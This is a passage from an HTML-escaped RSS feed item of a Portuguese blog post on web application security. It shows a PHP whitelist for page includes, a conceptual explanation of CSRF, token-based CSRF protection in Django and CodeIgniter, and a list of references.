+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;php&quot;&gt;&lt;pre class=&quot;language-php&quot;&gt;&lt;code class=&quot;language-php&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;switch&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$page&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;token keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;novidades&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;token keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;novidades.php&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;token keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;contato&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;token keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;contato.php&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;token keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;institucional&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;token keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;institucional.php&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;token keyword&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;token keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;404.php&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Este ataque não é tão incomum quanto deveria. Fique atento.&lt;/p&gt;
+&lt;h2&gt;CSRF – Cross-site request forgery (não confie na requisição)&lt;/h2&gt;
+&lt;p&gt;O &lt;strong&gt;&lt;em&gt;Cross-site request forgery&lt;/em&gt;&lt;/strong&gt; ou &lt;strong&gt;falsificação de solicitação
+entre sites&lt;/strong&gt;, é uma forma de ataque que mescla a &lt;a href=&quot;http://pt.wikipedia.org/wiki/Engenharia_social_(seguran%C3%A7a_da_informa%C3%A7%C3%A3o)&quot; title=&quot;Leia mais sobre Engenharia Social no Wikipedia&quot;&gt;Engenharia Social&lt;/a&gt;
+com vulnerabilidades das aplicações &lt;em&gt;web&lt;/em&gt;.&lt;/p&gt;
+&lt;p&gt;O ataque pode ser feito da seguinte forma:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Você recebe um &lt;em&gt;e-mail&lt;/em&gt; com uma &lt;em&gt;URL&lt;/em&gt; oculta (geralmente algum
+&lt;em&gt;e-mail&lt;/em&gt; do tipo “Veja as minhas fotos” (: )&lt;/li&gt;
+&lt;li&gt;Esta &lt;em&gt;URL&lt;/em&gt; executa alguma ação em uma aplicação que você esteja
+autenticado no momento (por exemplo, o &lt;em&gt;Facebook&lt;/em&gt;)&lt;/li&gt;
+&lt;li&gt;Esta ação pode, tanto dar poderes de acesso ao atacante, quanto
+alterar ou remover os seus dados permanentemente&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Note que o primeiro item pode ser substituído por algum &lt;strong&gt;conteúdo
+&lt;em&gt;link&lt;/em&gt; injetado via &lt;em&gt;XSS&lt;/em&gt;&lt;/strong&gt; em algum fórum ou área de comentários de um
+&lt;em&gt;blog&lt;/em&gt;.&lt;/p&gt;
+&lt;p&gt;Embora o exemplo acima não represente tanta ameaça, existem vários tipos
+de aplicações que este tipo de técnica pode afetar. O exemplo do banco,
+encontrado no &lt;em&gt;site&lt;/em&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)&quot; title=&quot;Leia mais sobre CSRF&quot;&gt;&lt;em&gt;The Open Web Application Security Project&lt;/em&gt;&lt;/a&gt;, é
+um excelente exempo de ataque &lt;em&gt;CSRF&lt;/em&gt;.&lt;/p&gt;
+&lt;p&gt;Para prevenir este tipo de problema, podemos fazer um controle através
+de &lt;a href=&quot;/2012/04/05/entendendo-os-cookies-e-sessoes.html&quot; title=&quot;Entendendo o Cookies e Sessões&quot;&gt;sessões&lt;/a&gt; e transmitir um &lt;em&gt;token&lt;/em&gt; que identifique que a requisição
+foi de fato feita pelo usuário. &lt;em&gt;Kinn Coelho Julião&lt;/em&gt; escreveu &lt;a href=&quot;http://phpsp.org.br/2011/07/protegendo-seu-sistema-contra-ataques-csrf/&quot; title=&quot;Protegendo seus sistemas contra ataques CSRF&quot;&gt;um &lt;em&gt;post&lt;/em&gt; interessante para o &lt;em&gt;PHP-SP&lt;/em&gt;&lt;/a&gt;,
+demonstrando como prevenir ataques &lt;em&gt;CSRF&lt;/em&gt; através de &lt;em&gt;token&lt;/em&gt;.&lt;/p&gt;
+&lt;p&gt;De fato, tanto o &lt;em&gt;Django&lt;/em&gt; quanto o &lt;em&gt;Codeigniter&lt;/em&gt; utilizam essa tática
+para prevenir ataques &lt;em&gt;CSRF&lt;/em&gt;. No &lt;em&gt;Django&lt;/em&gt;, com o &lt;em&gt;middleware&lt;/em&gt;
+&lt;code class=&quot;language-text&quot;&gt;django.middleware.csrf.CsrfViewMiddleware&lt;/code&gt;, basta adicionar a chamada
+da &lt;em&gt;templatetag&lt;/em&gt; ao formulário:&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;django-html&quot;&gt;&lt;pre class=&quot;language-django-html&quot;&gt;&lt;code class=&quot;language-django-html&quot;&gt;&amp;lt;form method=&amp;quot;post&amp;quot; action=&amp;quot;.&amp;quot;&amp;gt;
+    {% csrf_token %}
+    ...
+&amp;lt;/form&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;A &lt;em&gt;templatetag&lt;/em&gt; acima criará um campo oculto no formulário chamado
+&lt;code class=&quot;language-text&quot;&gt;csrfmiddlewaretoken&lt;/code&gt;. Quando um &lt;em&gt;POST&lt;/em&gt; for realizado para a &lt;em&gt;view&lt;/em&gt; em
+questão, caso o conteúdo de &lt;code class=&quot;language-text&quot;&gt;csrfmiddlewaretoken&lt;/code&gt; vindo do formulário
+não “bata” com o conteúdo armazenado em sessão, o &lt;em&gt;Django&lt;/em&gt; entende que
+aquela requisição não foi feita de maneira “natural” (ou seja, acessando
+o formulário e submetendo-o). Logo, fica subentendido que aquela
+requisição veio de outra origem, e o &lt;em&gt;framework&lt;/em&gt; não executa as
+instruções da &lt;em&gt;view&lt;/em&gt; (retornando um código 403).&lt;/p&gt;
+&lt;p&gt;No &lt;em&gt;Codeigniter&lt;/em&gt;, com a opção &lt;code class=&quot;language-text&quot;&gt;$config[&amp;#39;csrf_protection’]&lt;/code&gt; como
+&lt;code class=&quot;language-text&quot;&gt;TRUE&lt;/code&gt; no arquivo &lt;code class=&quot;language-text&quot;&gt;application/config/config.php&lt;/code&gt;, o &lt;em&gt;framework&lt;/em&gt;
+adicionará automaticamente o campo de proteção &lt;em&gt;CSRF&lt;/em&gt; na abertura do
+formulário:&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;php&quot;&gt;&lt;pre class=&quot;language-php&quot;&gt;&lt;code class=&quot;language-php&quot;&gt;&lt;span class=&quot;token php language-php&quot;&gt;&lt;span class=&quot;token delimiter important&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;form_open&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token delimiter important&quot;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h2&gt;Considerações finais&lt;/h2&gt;
+&lt;p&gt;Ficou um &lt;em&gt;post&lt;/em&gt; grande, mas acredito que consegui cobrir os problemas de
+segurança mais conhecidos em aplicações &lt;em&gt;Web&lt;/em&gt;. Como é possível notar,
+são vulnerabilidades que são facilmente contornáveis, mas que podem
+trazer sérios problemas para você e seus usuários caso a sua aplicação
+não esteja segura o bastante.&lt;/p&gt;
+&lt;p&gt;Reforço: Se você tiver a oportunidade de utilizar um &lt;em&gt;framework&lt;/em&gt;,
+utilize! Eles possuem soluções prontas e bem testadas para prevenir os
+problemas citados acima, e outros tantos que surgem a cada dia na
+&lt;em&gt;internet&lt;/em&gt;.&lt;/p&gt;
+&lt;h2&gt;Referências&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;http://www.dinke.net/blog/en/2011/10/20/validating-an-integer-with-php/&quot; title=&quot;As diferentes formas de validarmos um valor inteiro em PHP&quot;&gt;&lt;em&gt;Caugh in a Web: Validating an integer in PHP&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http://codeigniter.com/user_guide/database/active_record.html&quot; title=&quot;Saiba como fazer consultas eficientes ao banco de dados com o Codeigniter&quot;&gt;&lt;em&gt;Codeigniter User Guide: Active Record Class&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http://codeigniter.com/user_guide/general/security.html&quot; title=&quot;Veja as dicas de segurança dadas pelo time do Codeigniter&quot;&gt;&lt;em&gt;Codeigniter User Guide: Security&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://docs.djangoproject.com/en/1.4/topics/db/queries/&quot; title=&quot;Saiba como construir modelos e como consultá-los através do ORM do Django&quot;&gt;&lt;em&gt;Django Documentation: Making queries&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://docs.djangoproject.com/en/dev/topics/security/&quot; title=&quot;Veja dicas preciosas de segurança utilizando o Django&quot;&gt;&lt;em&gt;Django Documentation: Security in Django&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http://www.invasao.com.br/2008/03/18/php-injection-o-fim-das-duvidas/&quot; title=&quot;Entenda como funciona um ataque via PHP Injection&quot;&gt;Invasão.com.br: &lt;em&gt;PHP Injection&lt;/em&gt; – O fim das dúvidas&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http://www.php.net/manual/pt_BR/book.mysqli.php&quot; title=&quot;Conheça a mysqli direto da documentação do PHP&quot;&gt;&lt;em&gt;PHP Documentation: MySQL Melhorada&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http://php.net/pdo&quot; title=&quot;Conheça uma das formas mais eficientes de fazer consultas a bancos de dados no PHP&quot;&gt;&lt;em&gt;PHP Documentation: PDO – PHP Data Objects&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http://phpsp.org.br/2011/07/protegendo-seu-sistema-contra-ataques-csrf/&quot; title=&quot;Aprenda como utilizar tolkens para prevenir ataques CSRF&quot;&gt;&lt;em&gt;PHP SP&lt;/em&gt;: Protegendo o seu sistema contra ataques &lt;em&gt;CSRF&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http://www.sitepoint.com/php-security-blunders/&quot; title=&quot;Excelentes dicas de segurança para quem programa em PHP&quot;&gt;&lt;em&gt;Site Point: Top 7 PHP Security Blunders Article&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http://stackoverflow.com/questions/60174/best-way-to-stop-sql-injection-in-php&quot; title=&quot;Excelente thread no Stack Overflow, sobre SQL injection&quot;&gt;&lt;em&gt;Stack Overflow: Best way to stop SQL injection in PHP&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)&quot; title=&quot;Um bom artigo sobre o conceito do CSRF&quot;&gt;&lt;em&gt;The Open Web Application Security Project: Cross-Site Request Forgery&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http://en.wikipedia.org/wiki/Code_injection&quot; title=&quot;Leia mais sobre as formas de injeção de código no Wikipedia&quot;&gt;&lt;em&gt;Wikipedia: Code Injection&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http://pt.wikipedia.org/wiki/Inje%C3%A7%C3%A3o_de_SQL&quot; title=&quot;Leia mais sobre SQL Injection no Wikipedia&quot;&gt;&lt;em&gt;Wikipedia&lt;/em&gt;: Injeção de &lt;em&gt;SQL&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;</content:encoded></item></channel></rss>
